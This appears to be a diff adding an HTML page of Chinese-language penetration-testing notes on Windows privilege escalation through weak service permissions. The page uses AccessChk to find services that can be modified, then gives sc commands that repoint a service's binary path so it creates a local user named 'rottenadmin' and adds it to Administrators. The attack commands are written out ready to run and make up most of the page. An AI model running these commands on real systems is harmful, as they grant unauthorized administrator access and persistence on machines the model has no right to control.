@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>修改服务的bin地址</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>修改服务的bin地址</h1><br/><a href="http://www.freebuf.com/vuls/87463.html">http://www.freebuf.com/vuls/87463.html</a><br /><br />当我们在目标机器上下载了AccessChk后，我们可以执行以下命令来检查有哪个服务可以被我们修改：<br /><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk">https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk</a><br /><br /><br />accesschk.exe -uwcqv &quot;Authenticated Users&quot; * /accepteula<br /><br />下面让我们用sc命令来查看上面找到的服务的配置属性：<br /><br />sc qc servicename<br /><br />修改这个服务BINARY_PATH_NAME的值<br /><br />sc config PFNET binpath= &quot;net user rottenadmin P@ssword123! /add&quot;<br />sc stop PFNET<br />sc start PFNET<br />sc config PFNET binpath= &quot;net localgroup Administrators rottenadmin /add&quot;<br />sc stop PFNET<br />sc start PFNET<br /><br /><br />每当我们开启服务时sc命令都返回了一个错误。这是因为net user和net localgroup命令没有指向二进制服务，因此SCM无法与服务进行通信。但是别害怕，虽然报错了但是我们添加用户的命令却完成了：<br /><br />提权完成之后恢复binpath使其指向原先的值<p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>
